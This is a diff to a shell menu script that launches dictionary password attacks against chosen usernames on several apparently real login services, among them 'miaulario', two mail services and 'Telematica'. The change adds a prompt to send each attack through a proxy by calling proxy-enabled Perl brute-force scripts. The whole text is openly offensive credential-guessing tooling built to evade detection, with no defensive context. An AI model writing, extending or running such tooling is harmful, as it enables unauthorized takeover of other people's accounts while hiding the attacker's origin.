@@ -41,9 +41,19 @@ do
             echo ""
             echo "[+]Setting $username as target and executing attack"
             echo "[+]You will be informed every 100 tested passwords"
-            echo "[+]Please wait..." 
             echo ""
-            perl miaulario.pl $username $dictionary
+            echo "[+]Would you want to use proxy?[y/n]"
+            read option
+            opt="y"
+            echo ""
+            if [ "$option" = "$opt" ]; then
+                echo "[+]Enabling proxy forwarding."
+                echo "[+]Please wait..." 
+                perl miaularioP.pl $username $dictionary
+            else
+                echo "[+]Please wait..." 
+                perl miaulario.pl $username $dictionary
+            fi
             break
             ;;
         "CorreoA")
@@ -56,9 +66,19 @@ do
             echo ""
             echo "[+]Setting $username as target and executing attack"
             echo "[+]You will be informed every 100 tested passwords"
-            echo "[+]Please wait..." 
             echo ""
-            perl correoA.pl $username $dictionary
+            echo "[+]Would you want to use proxy?[y/n]"
+            read option
+            opt="y"
+            echo ""
+            if [ "$option" = "$opt" ]; then
+                echo "[+]Enabling proxy forwarding..."
+                echo "[+]Please wait..." 
+                perl correoAP.pl $username $dictionary
+            else
+                echo "[+]Please wait..." 
+                perl correoA.pl $username $dictionary
+            fi
             break
             ;;
         "CorreoP")
@@ -71,9 +91,19 @@ do
             echo ""
             echo "[+]Setting $username as target and executing attack"
             echo "[+]You will be informed every 100 tested passwords"
-            echo "[+]Please wait..." 
             echo ""
-            perl correoP.pl $username $dictionary
+            echo "[+]Would you want to use proxy?[y/n]"
+            read option
+            opt="y"
+            echo ""
+            if [ "$option" = "$opt" ]; then
+                echo "[+]Enabling proxy forwarding..."
+                echo "[+]Please wait..." 
+                perl correoPP.pl $username $dictionary
+            else
+                echo "[+]Please wait..." 
+                perl correoP.pl $username $dictionary
+            fi
             break
             ;;
         "Telematica")
@@ -87,9 +117,19 @@ do
             echo ""
             echo "[+]Setting $username as target and executing attack"
             echo "[+]You will be informed every 100 tested passwords"
-            echo "[+]Please wait..." 
             echo ""
-            perl tlm.pl $username $dictionary
+            echo "[+]Would you want to use proxy?[y/n]"
+            read option
+            opt="y"
+            echo ""
+            if [ "$option" = "$opt" ]; then
+                echo "[+]Enabling proxy forwarding..."
+                echo "[+]Please wait..." 
+                perl tlmP.pl $username $dictionary
+            else
+                echo "[+]Please wait..." 
+                perl tlm.pl $username $dictionary
+            fi
             break
             ;;
         "Quit")
